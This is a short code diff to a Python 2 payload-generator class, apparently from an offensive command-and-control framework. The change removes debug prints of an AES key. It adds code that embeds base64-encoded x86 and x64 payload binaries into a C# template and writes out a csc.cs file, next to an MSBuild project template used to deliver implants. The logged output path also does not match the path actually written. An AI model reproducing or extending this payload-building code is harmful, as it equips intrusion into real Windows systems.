@@ -27,13 +27,11 @@ class Payloads(object):
     self.ConnectURL = ConnectURL
     self.BaseDirectory = BaseDirectory
     if os.path.exists("%saes.py" % PayloadsDirectory):
-      print "FOUND AES"
       with open("%saes.py" % PayloadsDirectory, 'rb') as f:
         content = f.read()
         import re
         m = re.search('#KEY(.+?)#KEY', content);
         if m: keyfound = m.group(1)
-        print keyfound
         self.PythonHash = hashlib.sha512(content).hexdigest()
         self.PythonKey = keyfound
     else: 
@@ -498,6 +496,17 @@ End Sub
       x86base64 = base64.b64encode(b86.read())
     with open(x64filename, "rb") as b64:
       x64base64 = base64.b64encode(b64.read())  
+    with open("%scsc.cs" % FilesDirectory, 'rb') as f:
+      content = f.read()
+    ccode = content.replace("#REPLACEME32#",x86base64)
+    ccode = ccode.replace("#REPLACEME64#",x64base64)
+    filename = "%scsc.cs" % (self.BaseDirectory)
+    output_file = open(filename, 'w')
+    output_file.write(ccode)
+    output_file.close()
+    self.QuickstartLog( "" )
+    self.QuickstartLog( "CSC file written to: %s%scsc.cs" % (self.BaseDirectory,name) )
+
     projname = randomuri()
 
     msbuild="""<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
